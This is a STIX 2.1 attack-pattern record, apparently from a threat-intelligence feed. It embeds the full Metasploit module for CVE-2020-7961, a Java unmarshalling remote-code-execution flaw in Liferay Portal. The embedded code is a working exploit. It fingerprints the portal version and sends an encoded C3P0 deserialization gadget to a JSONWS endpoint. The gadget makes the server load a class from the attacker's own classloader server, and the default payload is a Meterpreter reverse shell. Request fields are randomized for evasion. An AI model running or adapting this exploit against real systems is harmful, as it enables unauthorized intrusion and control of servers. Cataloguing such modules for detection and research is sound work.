{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--891a967f-bee9-4b8e-992c-9df9951c0277",
    "created": "2024-08-14T17:11:36.302809Z",
    "modified": "2024-08-14T17:11:36.302813Z",
    "name": "Liferay Portal Java Unmarshalling via JSONWS RCE",
    "description": " This module exploits a Java unmarshalling vulnerability via JSONWS in Liferay Portal versions < 6.2.5 GA6, 7.0.6 GA7, 7.1.3 GA4, and 7.2.1 GA2 to execute code as the Liferay user. Tested against 7.2.0 GA1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/liferay_java_unmarshalling.rb",
            "external_id": "liferay_java_unmarshalling.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-7961"
        },
        {
            "source_name": "reference",
            "url": "https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.synacktiv.com/posts/pentest/how-to-exploit-liferay-cve-2020-7961-quick-journey-to-poc.html"
        },
        {
            "source_name": "reference",
            "url": "https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/117954271"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Java::HTTP::ClassLoader\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Liferay Portal Java Unmarshalling via JSONWS RCE',\n        'Description' => %q{\n          This module exploits a Java unmarshalling vulnerability via JSONWS in\n          Liferay Portal versions < 6.2.5 GA6, 7.0.6 GA7, 7.1.3 GA4, and 7.2.1\n          GA2 to execute code as the Liferay user. Tested against 7.2.0 GA1.\n        },\n        'Author' => [\n          'Markus Wulftange', # Discovery\n          'Thomas Etrillard', # PoC\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-7961'],\n          ['URL', 'https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html'],\n          ['URL', 'https://www.synacktiv.com/posts/pentest/how-to-exploit-liferay-cve-2020-7961-quick-journey-to-poc.html'],\n          ['URL', 'https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/117954271']\n        ],\n        'DisclosureDate' => '2019-11-25', # Vendor advisory\n        'License' => MSF_LICENSE,\n        'Platform' => 'java',\n        'Arch' => ARCH_JAVA,\n        'Privileged' => false,\n        'Targets' => [\n          ['Liferay Portal < 6.2.5 GA6, 7.0.6 GA7, 7.1.3 GA4, 7.2.1 GA2', {}]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'java/meterpreter/reverse_tcp'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8080),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    # GET / response contains a Liferay-Portal header with version information\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    )\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    unless res.headers['Liferay-Portal']\n      return CheckCode::Unknown(\n        'Target did not respond with Liferay-Portal header.'\n      )\n    end\n\n    # Building the Liferay-Portal header:\n    #   https://github.com/liferay/liferay-portal/blob/master/portal-kernel/src/com/liferay/portal/kernel/util/ReleaseInfo.java\n    #\n    # Liferay-Portal header data:\n    #   https://github.com/liferay/liferay-portal/blob/master/release.properties\n    #\n    # Example GET / response:\n    #   HTTP/1.1 200\n    #   [snip]\n    #   Liferay-Portal: Liferay Community Edition Portal 7.2.0 CE GA1 (Mueller / Build 7200 / June 4, 2019)\n    #   [snip]\n    version, build = res.headers['Liferay-Portal'].scan(\n      /^Liferay.*Portal ([\\d.]+.*GA\\d+).*Build (\\d+)/\n    ).flatten\n\n    unless version && build\n      return CheckCode::Detected(\n        'Target did not respond with Liferay version and build.'\n      )\n    end\n\n    # XXX: Liferay versions older than 7.2.1 GA2 (build 7201) \"may\" be unpatched\n    if build.to_i < 7201\n      return CheckCode::Appears(\n        \"Liferay #{version} MAY be a vulnerable version. Please verify.\"\n      )\n    end\n\n    CheckCode::Safe(\"Liferay #{version} is NOT a vulnerable version.\")\n  end\n\n  def exploit\n    # Start our HTTP server to provide remote classloading\n    @classloader_uri = start_service\n\n    unless @classloader_uri\n      fail_with(Failure::BadConfig, 'Could not start remote classloader server')\n    end\n\n    print_good(\"Started remote classloader server at #{@classloader_uri}\")\n\n    # Send our remote classloader gadget to the target, triggering the vuln\n    send_request_gadget(\n      normalize_uri(target_uri.path, '/api/jsonws/expandocolumn/update-column'),\n      # Required POST parameters for /api/jsonws/expandocolumn/update-column:\n      # https://github.com/liferay/liferay-portal/blob/master/portal-impl/src/com/liferay/portlet/expando/service/impl/ExpandoColumnServiceImpl.java\n      'columnId' => rand(8..42), # Randomize for \"evasion\"\n      'name' => rand(8..42), # Randomize for \"evasion\"\n      'type' => rand(8..42) # Randomize for \"evasion\"\n    )\n  end\n\n  # Convenience method to send our gadget to a URI with desired POST params\n  def send_request_gadget(uri, vars_post = {})\n    print_status(\"Sending remote classloader gadget to #{full_uri(uri)}\")\n\n    vars_post['+defaultData'] =\n      'com.mchange.v2.c3p0.WrapperConnectionPoolDataSource'\n\n    vars_post['defaultData.userOverridesAsString'] =\n      \"HexAsciiSerializedMap:#{go_go_gadget.unpack1('H*')};\"\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => uri,\n      'vars_post' => vars_post\n    }, 0)\n  end\n\n  # Generate all marshalsec payloads for the Jackson marshaller:\n  # java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson -a\n  def go_go_gadget\n    # Implementation of the Jackson marshaller's C3P0WrapperConnPool gadget:\n    # https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/C3P0WrapperConnPool.java\n    gadget = Rex::Text.decode_base64(\n      <<~EOF\n        rO0ABXNyAD1jb20ubWNoYW5nZS52Mi5uYW1pbmcuUmVmZXJlbmNlSW5kaXJlY3RvciRSZWZl\n        cmVuY2VTZXJpYWxpemVkYhmF0NEqwhMCAARMAAtjb250ZXh0TmFtZXQAE0xqYXZheC9uYW1p\n        bmcvTmFtZTtMAANlbnZ0ABVMamF2YS91dGlsL0hhc2h0YWJsZTtMAARuYW1lcQB+AAFMAAly\n        ZWZlcmVuY2V0ABhMamF2YXgvbmFtaW5nL1JlZmVyZW5jZTt4cHBwcHNyABZqYXZheC5uYW1p\n        bmcuUmVmZXJlbmNl6MaeoqjpjQkCAARMAAVhZGRyc3QAEkxqYXZhL3V0aWwvVmVjdG9yO0wA\n        DGNsYXNzRmFjdG9yeXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAFGNsYXNzRmFjdG9yeUxvY2F0\n        aW9ucQB+AAdMAAljbGFzc05hbWVxAH4AB3hwc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuv\n        AQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0\n        ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAHVyABNbTGphdmEubGFuZy5PYmplY3Q7\n        kM5YnxBzKWwCAAB4cAAAAApwcHBwcHBwcHBweHQABEhBQ0t0AANUSEV0AAZQTEFORVQ=\n      EOF\n    )\n\n    # Replace length-prefixed placeholder strings with our own\n    gadget.sub!(\"\\x00\\x04HACK\", packed_class_name)\n    gadget.sub!(\"\\x00\\x03THE\", packed_classloader_uri)\n    gadget.sub(\"\\x00\\x06PLANET\", packed_class_name)\n  end\n\n  # Convenience method to pack the classloader URI as a length-prefixed string\n  def packed_classloader_uri\n    \"#{[@classloader_uri.length].pack('n')}#{@classloader_uri}\"\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-11-25, # Vendor advisory",
    "x_mitre_platforms": [
        "java'"
    ]
}